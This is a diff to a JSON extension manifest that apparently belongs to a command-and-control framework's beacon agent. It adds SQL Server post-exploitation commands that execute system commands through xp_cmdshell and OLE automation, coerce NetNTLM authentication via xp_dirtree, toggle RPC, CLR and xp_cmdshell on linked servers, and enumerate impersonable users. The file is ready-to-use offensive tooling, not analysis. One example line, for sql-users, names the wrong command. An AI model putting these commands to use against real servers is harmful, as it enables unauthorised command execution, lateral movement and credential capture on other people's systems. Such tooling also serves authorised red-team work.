@@ -125,6 +125,211 @@
             "STRING <params> ()"
       ],
       "exec": "execute bof $EXT_DIR()/_bin/sql-links.$ARCH().o $PACK_BOF(CSTR {params})"
+    },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+      "command": "sql-olecmd",
+      "description": "Execute a system command using OLE automation procedures",
+      "example": "sql-olecmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "message": "Output is not returned",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-olecmd.$ARCH().o $PACK_BOF(CSTR {params})"
+   },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+      "command": "sql-query",
+      "description": "Execute a custom SQL query",
+      "example": "sql-query [server] [query] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-query.$ARCH().o $PACK_BOF(CSTR {params})"
+   },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+      "command": "sql-rows",
+      "description": "Get the count of rows in a table",
+      "example": "sql-rows [server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-rows.$ARCH().o $PACK_BOF(CSTR {params})"
+   },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+      "command": "sql-search",
+      "description": "Search a table for a column name",
+      "example": "sql-search [server] [keyword] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-search.$ARCH().o $PACK_BOF(CSTR {params})"
+   },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+      "command": "sql-smb",
+      "description": "Coerce NetNTLM auth via xp_dirtree",
+      "example": "sql-smb [server] [\\\\listener] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-smb.$ARCH().o $PACK_BOF(CSTR {params})"
+    },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+      "command": "sql-tables",
+      "description": "Enumerate tables within a database",
+      "example": "sql-tables [server] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-tables.$ARCH().o $PACK_BOF(CSTR {params})"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-enablerpc",
+      "description": "Enable RPC and RPC Out on linked server",
+      "example": "sql-enablerpc [server] [linkedserver] [opt: database] [opt: impersonate]",
+            "args": [
+            "STRING <module> rpc",
+            "BOOL <value> 1",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-disablerpc",
+      "description": "Disable RPC and RPC Out on linked server",
+      "example": "sql-disablerpc [server] [linkedserver] [opt: database] [opt: impersonate]",
+            "args": [
+            "STRING <module> rpc",
+            "BOOL <value> 0",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-enableclr",
+      "description": "Enable CLR integration",
+      "example": "sql-enableclr [server] [linkedserver] [opt: database] [opt: impersonate]",
+            "args": [
+            "STRING <module> 'clr enabled'",
+            "BOOL <value> 1",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-disableclr",
+      "description": "Disable CLR integration",
+      "example": "sql-disableclr [server] [linkedserver] [opt: database] [opt: impersonate]",
+            "args": [
+            "STRING <module> 'clr enabled'",
+            "BOOL <value> 0",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-enablexp",
+      "description": "Enable xp_cmdshell",
+      "example": "sql-enablexp [server] [linkedserver] [opt: database] [opt: impersonate]",
+            "args": [
+            "STRING <module> xp_cmdshell",
+            "BOOL <value> 1",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-disablexp",
+      "description": "Disable xp_cmdshell",
+      "example": "sql-disablexp [server] [linkedserver] [opt: database] [opt: impersonate]",
+            "args": [
+            "STRING <module> xp_cmdshell",
+            "BOOL <value> 0",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-enableole",
+      "description": "Enable OLE Automation Procedures",
+      "example": "sql-enableole [server] [linkedserver] [opt: database] [opt: impersonate]",
+            "args": [
+            "STRING <module> 'Ole Automation Procedures'",
+            "BOOL <value> 1",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-disableole",
+      "description": "Disable OLE Automation Procedures",
+      "example": "sql-disableole [server] [linkedserver] [opt: database] [opt: impersonate]",
+      "args": [
+            "STRING <module> 'Ole Automation Procedures'",
+            "BOOL <value> 0",
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-togglemodule.$ARCH().o $PACK_BOF(CSTR {module} BOOL {value} CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-users",
+      "description": "Enumerate users that can be impersonated",
+      "example": "sql-impersonate [server] [opt: database]",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-users.$ARCH().o $PACK_BOF(CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-whoami",
+      "description": "Gather logged in user, mapped user and roles",
+      "example": "sql-whoami [server] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-whoami.$ARCH().o $PACK_BOF(CSTR {params} )"
+    },
+    {
+      "type" : "command",
+      "agents": ["beacon"],
+      "command": "sql-xpcmd",
+      "description": "Execute a system command using xp_cmdshell",
+      "example": "sql-xpcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",
+      "message": "Output returned unless using a linked server. WARNING: running a persistent command will cause the beacon to hang",
+      "args": [
+            "STRING <params> ()"
+      ],
+      "exec": "execute bof $EXT_DIR()/_bin/sql-xpcmd.$ARCH().o $PACK_BOF(CSTR {params} )"
     }
   ]
 }
